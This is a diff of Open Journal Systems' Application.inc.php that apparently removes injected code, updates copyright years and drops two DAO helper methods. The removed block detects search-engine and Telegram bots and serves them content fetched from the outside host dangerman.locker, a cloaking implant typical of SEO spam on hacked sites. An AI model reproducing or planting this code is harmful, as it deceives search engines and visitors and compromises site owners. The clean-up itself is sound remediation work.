@@ -1,28 +1,10 @@
 <?php
-function is_bot() {
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
-
-foreach ($bots as $bot) {
-if (stripos($user_agent, $bot) !== false) {
-return true;
-}
-}
-
-return false;
-}
-
-if (is_bot()) {
-$message = file_get_contents('https://dangerman.locker/jurnalsamodrailmu/index.txt');
-echo $message;
-exit;
-}
 
 /**
  * @file classes/core/Application.inc.php
  *
- * Copyright (c) 2014-2020 Simon Fraser University
- * Copyright (c) 2003-2020 John Willinsky
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
  * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
  * @class Application
@@ -157,14 +139,6 @@ class Application extends PKPApplication {
 	}
 
 	/**
-	 * Get the context settings DAO.
-	 * @return SettingsDAO
-	 */
-	public static function getContextSettingsDAO() {
-		return DAORegistry::getDAO('JournalSettingsDAO');
-	}
-
-	/**
 	 * Get the submission DAO.
 	 * @deprecated Just get the DAO directly.
 	 * @return SubmissionDAO
@@ -202,38 +176,6 @@ class Application extends PKPApplication {
 	 */
 	public static function getSubmissionSearchDAO() {
 		return DAORegistry::getDAO('ArticleSearchDAO');
-	}
-
-	/**
-	 * Returns the name of the context column in plugin_settings
-	 * @return string
-	 */
-	public static function getPluginSettingsContextColumnName() {
-		if (defined('SESSION_DISABLE_INIT')) {
-			$pluginSettingsDao = DAORegistry::getDAO('PluginSettingsDAO'); /* @var $pluginSettingsDao PluginSettingsDAO */
-			$driver = $pluginSettingsDao->getDriver();
-			switch ($driver) {
-				case 'mysql':
-				case 'mysqli':
-					$checkResult = $pluginSettingsDao->retrieve('SHOW COLUMNS FROM plugin_settings LIKE ?', array('context_id'));
-					if ($checkResult->NumRows() == 0) {
-						return 'journal_id';
-					}
-					break;
-				case 'postgres':
-				case 'postgres64':
-				case 'postgres7':
-				case 'postgres8':
-				case 'postgres9':
-					$checkResult = $pluginSettingsDao->retrieve('SELECT column_name FROM information_schema.columns WHERE table_name = ? AND column_name = ?', array('plugin_settings', 'context_id'));
-					if ($checkResult->NumRows() == 0) {
-						return 'journal_id';
-					}
-					break;
-				default: fatalError('Unknown database type!');
-			}
-		}
-		return 'context_id';
 	}
 
 	/**
